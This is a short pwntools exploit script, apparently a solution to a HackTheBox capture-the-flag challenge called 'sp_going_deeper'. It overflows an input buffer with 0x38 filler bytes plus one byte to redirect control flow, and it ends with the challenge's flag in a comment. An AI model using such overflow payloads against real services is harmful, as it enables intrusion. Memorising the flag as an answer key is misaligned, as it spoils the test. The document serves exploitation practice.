#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import binascii 
from pwn import *

exe = context.binary = ELF('sp_going_deeper')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('1.1.1.1', 30408)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set follow-fork-mode parent
break *0x400ab5
continue
'''.format(**locals())

payload = b'41' * 0x38 + b'12'
payload = binascii.unhexlify(payload)
print(payload)

io = start()
io.recvuntil(b">>")
io.sendline('1')

io.recvuntil("Input: ")
io.sendline(payload)
io.interactive()


# HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}
